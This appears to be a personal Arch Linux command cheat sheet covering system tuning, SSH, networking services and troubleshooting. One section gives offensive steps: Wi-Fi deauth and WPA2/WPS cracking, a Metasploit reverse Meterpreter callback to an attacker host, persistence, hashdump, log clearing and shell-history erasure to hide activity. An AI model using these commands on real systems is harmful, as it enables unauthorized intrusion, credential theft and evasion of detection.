            nano /etc/mkinitcpio.conf # add "plymouth" in HOOKS between "base" and "udev"
            # configure /etc/plymouth/plymouthd.conf
            cp <background_image> /usr/share/plymouth/themes/<theme>/background-tile.png
            cp /usr/share/plymouth/arch-logo.png /usr/share/plymouth/themes/spinner/watermark.png
            nano /usr/share/plymouth/themes/<theme>/<theme>.plymouth <# write the following
                WatermarkHorizontalAlignment=.5
                WatermarkVerticalAlignment=.5
            #>
            # regenerate initramfs-linux.img
    ## optimization
        ### boot optimization
            #### services
                systemd-analyze time # show how long the boot took
                systemd-analyze blame # show which units took the most time
                systemd-analyze critical-chain # show a tree of the time-critical chain of units
                systemd-analyze plot > bootplot.svg # see bootplot.svf with GIMP
                systemctl # show runned services
                # disable unneeded services with systemctl
            #### preload
                gopreload # install from AUR (gopreload-git)
                # enable and start gopreload service
                gopreload-prepare <application> # prepare application to faster load
                gopreload-batch-refresh.sh # refresh preloaded apps
                # see /usr/share/gopreload/enabled/ for preloaded apps
            #### prelink
                prelink # install from AUR
                prelink -amR # prelinking
                echo "export KDE_IS_PRELINKED=1" > /etc/profile.d/kde-is-prelinked.sh && chmod 755 /etc/profile.d/kde-is-prelinked.sh # KDE prelinking
                prelink -au # removing prelink
            #### stress test
                pacman -S stress memtest86+ # and memtest86
                pacman -S smartmontools
                stress # tool to impose load on and stress test systems
                # update GRUB configuration for memtest86 and memtest86+
                smartctl # control and monitor utility for S.M.A.R.T. (and not only) disks
        ### CPU and RAM optimization
            pacman -S cpulimit cgmanager
            zramswap # install from AUR # run zramswap service
        ### pacman optimization
            pacman -Sc # delete cache
            pacman -S pacutils # install pacman utilities
            paccheck --list-broken # check installed packages
        ### disk optimization
            #### mount optimization
                nano /etc/fstab # swap relatime for noatime
            #### disk partition optimization
                1. XFS - good for big and bad for small files; for /home;
                2. Reiserfs - good for small files, for /var;
                3. Ext3 - middle performance, stable;
                4. Ext4 - very high performance, stable, bad for SQLite and other DB;
                5. JFS - high performance, consumes few processor resources;
                6. Btrfs - the highest performance, conditionally stable, functionable, under development.
        ### ram cache optimization
            nano /etc/sysctl.d/99-sysctl.conf # set "vm.vfs_cache_pressure=500" (from 0 to 1000 inversely to RAM volume)
        ### flush pagecache, dentries and inodes
            free -m && sync && echo 3 > /proc/sys/vm/drop_caches && free -m
    ## additional devices
        ### use PS controller as XBox
            xboxdrv
            ls /dev/input/ | grep event* # look for controller event
            xboxdrv --evdev <event> --evdev-absmap <absmap> --axismap <axismap> --evdev-keymap <keymap> --mimic-xpad --silent
            # <absmap> ABS_X=x1,ABS_Y=y1,ABS_RZ=x2,ABS_Z=y2,ABS_HAT0X=dpad_x,ABS_HAT0Y=dpad_y # parameters for PS2
            # <axismap> -Y1=Y1,-Y2=Y2 # parameters for PS2
            # <keymap> BTN_TOP=x,BTN_TRIGGER=y,BTN_THUMB2=a,BTN_THUMB=b,BTN_BASE3=back,BTN_BASE4=start,BTN_BASE=lb,BTN_BASE2=rb,BTN_TOP2=lt,BTN_PINKIE=rt,BTN_BASE5=tl,BTN_BASE6=tr # parameters for PS2
        ### game controllers test
            pacman -S linuxconsole
            # use fftest, ffcfstress and ffmvforce (for steering wheel) and jstest (for joystick)
    ## digital signature utilities
        ### GnuPG
            gpg --full-gen-key # to create key
            gpg --armor --output public.key --export <keyID> # to export key
            # there is revocation certificate in ~/.gnupg
            gpg --sign <file> # to create signed file <file>.gpg
            gpg --verify <file> # to verify signed file <file>.gpg
            gpg --output <content_file> --decrypt <signed_file> # to extract contents from the file
            gpg --output <signature_file> --clearsign <file> # to clear sign the documents
            gpg --armor --detach-sig <file> # to create detached signature
            gpg --verify <signature_file> <file> # to verify the detached signature
            gpg --sign --encrypt --recipient <recipient> <file> # to encrypt and sign a file
        ### SSL
            openssl genrsa -des3 -passout pass:<password> -out keypair.key 2048
            mkdir /etc/httpd/httpscertificate -p
            openssl rsa -passin pass:<password> -in keypair.key -out /etc/httpd/httpscertificate/<address>.key
            rm keypair.key
            openssl req -new -key /etc/httpd/httpscertificate/<address>.key -out /etc/httpd/httpscertificate/<address>.csr
            openssl x509 -req -days <days> -in /etc/httpd/httpscertificate/<address>.csr -signkey /etc/httpd/httpscertificate/<address>.key -out /etc/httpd/httpscertificate/<address>.crt
            openssl dhparam -out dhparam4096.pem 4096
    ## SSH
        ### key generation
            ssh-keygen # to create key
            # now you can find your keys in ~/.ssh
        ### SSH server
            nano /etc/ssh/sshd_config <# add/set next
                Port <port>
                Protocol 2
                AddressFamily any
                ListenAddress 0.0.0.0
                ListenAddress ::
                PermitRootLogin no
                AllowUsers <users_separated_by_spaces>
                PasswordAuthentication no # for authentication only by ssh keys
                PermitEmptyPasswords no
                PubkeyAuthentication yes # for authentication by ssh keys
                AuthorizedKeysFile .ssh/authorized_keys # for authentication by ssh keys
                AllowTcpForwarding yes # for TCP forwarding
                AllowStreamLocalForwarding yes # for TCP forwarding
                GatewayPorts clientspecified # for TCP forwarding
                X11DisplayOffset 10 # for X11 forwarding
                X11UseLocalhost yes # for X11 forwarding
                X11Forwarding yes # for X11 forwarding
                PermitTunnel yes # for tunneling
                Banner <login_message_file>
                SyslogFacility AUTH
                LogLevel INFO
                LoginGraceTime 60
            #>
            sshd -t # test your configuration file
            nano .ssh/authorized_keys # add your public ssh key for autorization by private
            # start sshd.service
            ssh-copy-id -i <private_key> -p <port> <user>@<host>
            #### bind to specific address
                cp /lib/systemd/system/sshd.socket /etc/systemd/system/sshd.socket
                nano /etc/systemd/system/sshd.socket <# add/set next
                    ListenStream=<address>
                    # in [Socket] section
                    FreeBind=true
                #>
                # start sshd.socket
            #### fail2ban
                nano /etc/fail2ban/jail.local <# type next
                    [DEFAULT]
                    bantime = 1d

                    [sshd]
                    enabled = true
                #>
        ### SSH client
            ssh <ip>
            ssh <user>@<ip>
            ssh <ip> -p <port> -l <user> -i <private_key>
            ssh -N -L <local_ip>:<local_port>:<remote_ip>:<remote_port> -p <proxy_ssh_port> <proxy_user>@<proxy_host> # forward traffic from local port to remote
            ssh -N -R <local_ip>:<local_port>:<remote_ip>:<remote_port> -p <proxy_ssh_port> <proxy_user>@<proxy_host> # forward traffic from remote port to local
            ssh -X <ip> # connect with X11
            ssh -Y <ip> # connect with trusted X11
        ### Secure CoPy
            scp <user>@<host>:<source> <destination> # copy from host to local machine
            scp <source> <user>@<host>:<destination> # copy from local machine to host
            scp -r -P <port> <source> <user>@<host>:<destination> # copy folder with port specification
        ### Secure SHell FileSystem
            sshfs <user>@<host>:<remote_dir> <local_dir> -p <port> # mount remote directory to local mountpoint directory and specify port
            fusermount -u <local_dir>
        ### Secure FTP
            sftp -P <port> <user>@<host> # run FTP session over SSH with specified port
        ### VPN over SSH
            #### Point-to-Point
                ##### PermitRootLogin yes
                    sudo ssh -o PermitLocalCommand=yes -o LocalCommand="ifconfig tun<tun_number> <local_host_vpn_ip_address>/30 pointopoint <remote_host_vpn_ip_address>" -w <tun_number>:<tun_number> root@<remote_host> "ifconfig tun<tun_number> <remote_host_vpn_ip_address>/30 pointopoint <local_host_vpn_ip_address>"
                ##### PermitRootLogin no
                    sudo ip tuntap add tun<tun_number> mode tun
                    sudo ip addr add <local_host_vpn_ip_address>/30 dev tun<tun_number>
                    sudo ip link set tun<tun_number> up
                    sudo ssh -w <tun_number>:<tun_number> <sudo_user>@<remote_host> # repeat the last 3 steps on the remote host (with the appropriate parameters)
            #### Site-to-Site
                # connect two gateways over PPP
                # follow next steps on one of the gateways
                route add -net <remote_network_ip_address>/<remote_network_mask_postfix> dev tun<tun_number>
                # enable IP forwarding
                iptables -A FORWARD -s <local_network_ip_address>/<local_network_mask_postfix> -d <remote_network_ip_address>/<remote_network_mask_postfix> -j ACCEPT
                iptables -A FORWARD -d <local_network_ip_address>/<local_network_mask_postfix> -s <remote_network_ip_address>/<remote_network_mask_postfix> -j ACCEPT
                iptables -t nat -A POSTROUTING -o tun<tun_number> -s <local_network_ip_address>/<local_network_mask_postfix> -j MASQUERADE
                # repeat these steps on another gateway (with the appropriate parameters)
    ## advanced networking
        ### sysctl
            nano /etc/sysctl.conf <# type next
                net.ipv4.ip_forward=1
                net.ipv4.conf.all.accept_redirects=0
                net.ipv4.icmp_echo_ignore_broadcasts=1
                net.ipv4.icmp_ignore_bogus_error_responses=1
                net.ipv4.tcp_syncookies=1
                net.ipv4.tcp_timestamps=0
                net.ipv4.conf.all.rp_filter=1
                net.ipv4.tcp_max_syn_backlog=1280
                net.ipv6.conf.all.forwarding=1
                net.ipv6.conf.all.accept_redirects=0
                kernel.core_uses_pid=1
            #>
            sysctl -p
        ### snort
            nano /etc/snort/snort.conf <# change
                # change ipvar HOME_NET [<subnet>/<subnet_mask_postfix>]
                # change var RULE_PATH rules
                # change var SO_RULE_PATH so_rules
                # change var PREPROC_RULE_PATH preproc_rules
                # change var WHITE_LIST_PATH rules
                # change var BLACK_LIST_PATH rules
                # change dynamicpreprocessor directory /usr/lib/snort_dynamicpreprocessor/
                # change dynamicengine /usr/lib/snort_dynamicengine/libsf_engine.so
                # comment dynamicdetection directory /usr/local/lib/snort_dynamicrules
                # decomment output alert_syslog: LOG_AUTH LOG_ALERT
                # comment all rule includes except local.rules
                # add include $RULE_PATH/community-rules/community.rules
            #>
            wget https://www.snort.org/downloads/community/community-rules.tar.gz -O community-rules.tar.gz
            tar -xvzf community-rules.tar.gz -C /etc/snort/rules
            snort -T -c /etc/snort/snort.conf # to verify configuration
            nano /usr/lib/systemd/system/snort@.service <# type next
                [Unit]
                Description=Snort IDS system listening on '%I'

                [Service]
                Type=simple
                ExecStartPre=/usr/sbin/ip link set up dev %I
                ExecStartPre=/usr/bin/ethtool -K %I gro off
                ExecStart=/usr/bin/snort --daq-dir /usr/lib/daq/ -A fast -b -p -u snort -g snort -c /etc/snort/snort.conf -i %I -Q

                [Install]
                Alias=multi-user.target.wants/snort@%i.service
            #>
            systemctl enable --now snort@<interface_1>:<interface_2> # inline mode (IPS)
            systemctl enable --now snort@<interface> # IDS mode
        ### DHCP
            nano /etc/dhcpd.conf <# type next
                option domain-name-servers <dns_ips_comma_separated>; # Google default DNS (8.8.8.8 and 8.8.4.4) or yours
                option subnet-mask <network_mask>;
                option routers <routers_ips_comma_separated>; # your device's default IP
                subnet <network_ip> netmask <network_mask> {
                    range <dhcp_ip_range_beginning> <dhcp_ip_range_end>;
                }
            #>
            nano /etc/systemd/system/dhcpd4@.service <# type next
                [Unit]
                Description=IPv4 DHCP server on %I
                Wants=network.target
                After=network.target

                [Service]
                Type=forking
                PIDFile=/run/dhcpd4.pid
                ExecStart=/usr/bin/dhcpd -4 -q -pf /run/dhcpd4.pid %I
                KillSignal=SIGINT

                [Install]
                WantedBy=multi-user.target
            #>
            systemctl enable --now dhcpd4@<network_interface>
        ### DNS
            nano /etc/unbound/unbound.conf <# type next
                server:
                    root-hints: root.hints
                    trust-anchor-file: trusted-key.key
                    local-zone: "<blacklisted_ip>" always_nxdomain
                    local-data: "<record_name> <record_type> <record_value>"
                forward-zone:
                    name: <address_to_forward>
                    forward-addr: <dns_server_ip>
                    interface: <listen_interface>
                    access-control: <subnet_ip>/<subnet_mask_postfix> <action>
                remote-control:
                    control-enable: yes
                    control-interface: 127.0.0.1
                    control-port: 8953
                    server-key-file: "/etc/unbound/unbound_server.key"
                    server-cert-file: "/etc/unbound/unbound_server.pem"
                    control-key-file: "/etc/unbound/unbound_control.key"
                    control-cert-file: "/etc/unbound/unbound_control.pem"
            #>
            systemctl enable --now unbound
            unbound-control-setup
            unbound-control # you can use it to control Unbound server
        ### Internet sharing
            ip link set up dev <inner_network_interface>
            ip addr add <host_ip_address>/<inner_network_mask_postfix> dev <inner_network_interface> # The first 3 bytes of this address cannot be exactly the same as those of another interface, unless both interfaces have netmasks strictly greater than /24.
            iptables -t nat -A POSTROUTING -o <outer_network_interface> -j MASQUERADE
            iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
            iptables -A FORWARD -i <inner_network_interface> -o <outer_network_interface> -j ACCEPT
            #### assign ip address manually (on client side)
                ip addr add <client_ip_address>/<inner_network_mask_postfix> dev <client_network_interface>
                ip link set up dev <client_network_interface>
                ip route add default via <host_ip_address> dev <client_network_interface>
            #### assign ip address using DHCP
                iptables -I INPUT -p udp --dport 67 -i <inner_network_interface> -j ACCEPT
                iptables -I INPUT -p udp --dport 53 -s <inner_network_ip_address>/<inner_network_mask_postfix> -j ACCEPT
                iptables -I INPUT -p tcp --dport 53 -s <inner_network_ip_address>/<inner_network_mask_postfix> -j ACCEPT
                # configure DHCP
        ### FTP
            nano /etc/vsftpd.conf # and enable service
        ### OpenVPN
            # OpenVPN requires TUN/TAP support, which is already configured in the default kernel
            # read https://wiki.archlinux.org/index.php/OpenVPN
        ### EMail
            # you can use Exim and Postfix with SpamAssasin and ClamAV
            # read https://wiki.archlinux.org/index.php/Exim
            # read https://wiki.archlinux.org/index.php/Postfix
        ### Samba
            # read https://wiki.archlinux.org/index.php/Samba
        ### Windows Active Directory integration
            # read https://wiki.archlinux.org/index.php/Active_Directory_integration
        ### RAID
            mdadm
        ### DFS
            # read https://wiki.archlinux.org/index.php/Glusterfs
            # read https://wiki.archlinux.org/index.php/Ceph
        ### archiso
            mkdir <live_medium> & cd <live_medium>
            cp -r /usr/share/archiso/configs/<profile>/ <live_medium> # where <profile> is releng (customizable) or baseline (minimalistic) live medium configs
            nano pacman.conf # edit servers (you can add packages from AUR as packages from local repository)
            nano packages.x86_64 # edit package list
            # add needed files to airootfs (archiso root directory image)
            sh build.sh # build ISO image
    ## cracking and network tools using
        ### nmap
            nmap -sn <network_ip>/<network_mask> # scan local network on devices
            nmap <target_ip> -p 1-1024 -O -A -sV # scan opened ports, operation system and runned services
            nmap <target_ip> --script=<script> # execute script on target
            proxychains nmap --spoof-mac 0 <args> # run it with each command to hide your MAC and IP
        ### aircrack-ng tools
            airmon-ng check kill
            ip link set <WiFi_interface> down
            iw <WiFi_interface> set monitor control
            ip link set <WiFi_interface> up
            airodump-ng <WiFi_interface> # sniffing
            aireplay-ng <WiFi_interface> --deauth 150 -a <BSSID> # deauth
            airodump-ng <WiFi_interface> -c 1 --bssid <BSSID> -w sipheredKeys # wpa2 keys interception
            aircrack-ng -w wordlist.txt -l password.txt sipheredKeys-01.cap # wpa2 key bruteforce
            reaver -i <WiFi_interface> -c 1 -b <BSSID> -vv # WPS bruteforce
            ip link set <WiFi_interface> down
            iw <WiFi_interface> set type managed
            ip link set <WiFi_interface> up
            systemctl start NetworkManager wpa_supplicant
        ### Metasploit Project
            msfconsole
            db_connect msf@msf
            workspace
            # basic functionalities
            search <module_program_exploit_another> # to search needed module
            use <module> # use module
            show options # show module options
            show advanced # show module advanced options
            show payloads # show module payloads
            set <option> <value> # set option value
            set verbose true # show all processes while module running
            run # run module
            exploit # also run module
            msfvenom -a <architecture> --platform <platform> -f <file_extension> -p <payload_and_options> -e <encryption_algorithm> -i <encryption_iterations> > <file_name>.<file_extension> # create executable exploit file
            # end basic functionalities
            db_nmap # nmap by MSF with database connection
            db_export -f xml <path>/exportDB.xml # export to XML-file from DB
            db_import <path>/importDB.xml # import from XML-file to DB
            hosts # get host list from DB
            services # get services list from DB
            # useful modules : meterpreter, checkvm, getcountermeasure, getgui, get_local_subnets, gettelnet
            #### reverse Meterpreter shell
                # create executable file with payload <os>/meterpreter/reverse_tcp (LHOST=<attacker_or_proxy_ip>, LPORT=<attacker_port>) and execute it on target computer
                use exploit/multi/handler
                set PAYLOAD <os>/meterpreter/reverse_tcp
                set LHOST <attacker_or_proxy_ip>
                set LPORT <attacker_or_proxy_port>
                run
                ##### SOCKS proxy and SSH tunneling
                    proxychains ssh -N -L <local_port>:<target_ip>:<target_port> <proxy_user>@<proxy_ip> -p <proxy_ssh_port>
                # if connected follow next meterpreter shell commands
                migrate # migrates to explorer's process
                getsystem # gets system rights
                run persistence -S -i 5 -r <attacker_or_proxy_ip> -p <attacker_port> # runs meterpreter as service with system rights after reboot
                sysinfo # info about target system
                background # runs shell in background
                clearev # clears logs and cover the tracks
                download <file> # downloads file from target
                upload <file> <path> # uploads file into target's path
                execute <command> # executes command on target
                # see getuid, idletime, ps, hashdump, search, shell, webcam_list, webcam_snap, winenum, scraper, keylogrecorder, getgui, uictl and other commands in the documentation
                # basic Unix commands : cd, pwd, ls, edit, cat
        ### how to cover the tracks
            export HISTFILE=/dev/null
            # use <space><command> instead of <command>
            unset HISTFILE
            unset SAVEHIST
            python nojail.py --user <user> --ip <your_ip> --hostname <host>
    ## compile Linux kernel
        wget https://cdn.kernel.org/pub/linux/kernel/v<version_major>.x/linux-<version>.tar.xz # get kernel source code
        wget https://cdn.kernel.org/pub/linux/kernel/v<version_major>.x/linux-<version>.tar.sign # get PGP signature
        gpg --verify linux-<version>.tar.sign linux-<version>.tar.xz # get public key
        gpg --recv-keys <public_key> # download public key
        gpg --verify linux-<version>.tar.sign linux-<version>.tar.xz # continue if verification is successful
        tar -xf linux-<version>.tar.xz # extract
        cd linux-<version> # go to directory
        zcat /proc/config.gz > .config
        make menuconfig # configure Linux kernel for your needs
        make -j$(($(nproc) + 1 < $(cat /proc/meminfo | grep MemAvailable | sed 's/[^0-9]*//g') / 2 ? $(nproc) + 1 : $(cat /proc/meminfo | grep MemAvailable | sed 's/[^0-9]*//g') / 2)) # compile Linux kernel
        make modules_install && make install # install kernel modules and the kernel itself
        # mkinitcpio and grub-mkconfig
    ## creating well secured system
        # make strong passwords for the BIOS/UEFI and the bootloader
        # disable useless devices with BIOS/UEFI
        ### hard way
            # install clean Arch
            # compile your own kernel, then harden it and the glibc's malloc()
            # update packages and the CPU microcode
            # encrypt your disks, configure rights
            # make strong passwords for all users and disable root login
            # install and setup security tools
            #### make your own firewall image using archiso
                # repeat all previous steps
                # setup iptables to filter and forward traffic to your system with policy DROP
                # make your MAC address change every boot
                # make your system boot this image to access Internet, forward network interfaces to this image and block their direct connections to your system
            # sandbox unknown applications
        ### easy way
            # install Qubes OS (security), Whonix (security and anonymity) or Tails (anonymity)
#


4. Troubleshooting
    ## pacman or ldconfig error
        pacman --force -S $(pacman -Qqen) # in newer version --overwrite instead of --force
    ## pacman gpg error
        ### good way
            # upgrade and reboot some times
        ### bad way
            rm -rf /etc/pacman.d/gnupg
            rm -rf /var/lib/pacman/sync
            pacman-key --init
            pacman-key --populate archlinux
            pacman-key --refresh-keys
            pacman -Syy
        ### another bad way
            nano /etc/pacman.conf # add under [options] section "SigLevel = TrustAll"
    ## pacman warning: directory permissions differ
        pacman-fix-permissions # install from AUR
        pacman-fix-permissions -a
    ## wifi-menu does not work
        sudo rfkill unblock wlan
        sudo ip link set wlp3s0 down
        sudo ip link set wlp3s0 up
    ## shared NTFS partition between Windows 10 and Arch Linux
        powercfg /h off # on Windows with administrator's rights
    ## unable to write to disk (filesystem check needed)
        # unmount fs
        ### 1st method
            fsck /dev/sdX
        ### 2nd method
            pacman -S ntfs-3g
            ntfsfix /dev/sdX
        # mount fs
    ## Xorg configuration reset
        Xorg :0 -configure
        cp /root/xorg.conf.new /etc/X11/xorg.conf
    ## Failed to start Load/Save Brightness of backlight:acpi_video0 and Failed to start Load/Save Screen Backlight Brightness of backlight:amdgpu_b10
        nano /etc/default/grub # add "acpi_backlight=video video.use_native_backlight=0" to GRUB_CMDLINE_LINUX_DEFAULT
    ## no sound after hibernation with ALSA
        systemctl suspend
    ## tearing
        # use Wayland instead of X Windows System
        # edit output settings in Plasma
    ## resolution fix after display connect
        xrandr # grep your primary screen and connected displays
        nano ~/.bash_profile <# add this
            xrandr --output LVDS-1-1 --mode 1366x768
            xrandr --output HDMI-1-1 --mode 1360x768
            # xrandr --output <interface> --mode <resolution>
        #>
    ## mkinitcpio: possibly missing firmware for modules aic94xx, wd719x and xhci_pci
        aic94xx-firmware wd719x-firmware upd72020x-fw # install from AUR
        mkinitcpio -p linux
    ## reinstall pip
        sudo rm -rf /usr/lib/python3.7/<problem_directory>
        sudo python3.7 -m ensurepip
        sudo pip install --upgrade pip
    ## HP UEFI boots from 2nd EFI partition (Windows) instead of 1st (GRUB2)
        # rename /EFI/Microsoft/Boot/bootmgfw.efi
    ## unresolved bugs
        # sudden touchpad disconnection at startup
        # cannot change wrong password timeout
        # tty special keys not working
        # mute LED not working
        # no way to run MS Office or MS Visual Studio
#


# Malovanyi Denys Olehovych (21.11.2003, Vinnytsia, Ukraine)
# Since March 2019.
